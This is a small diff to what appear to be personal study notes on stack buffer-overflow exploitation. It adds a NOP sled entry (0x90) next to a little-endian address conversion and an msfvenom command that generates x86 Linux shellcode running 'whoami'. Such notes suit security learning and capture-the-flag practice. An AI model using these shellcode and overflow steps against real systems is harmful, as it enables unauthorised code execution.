@@ -95,6 +95,9 @@ COLUMNS=104
 (grab 5?)(reverse them?(little endian))
 0xf7de3b59 -> \x59\x3b\xde\xf7
 
+NOOP SLED:
+0x90
+
 SHELLCODE:
 msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python (can change CMD to different commands)
 
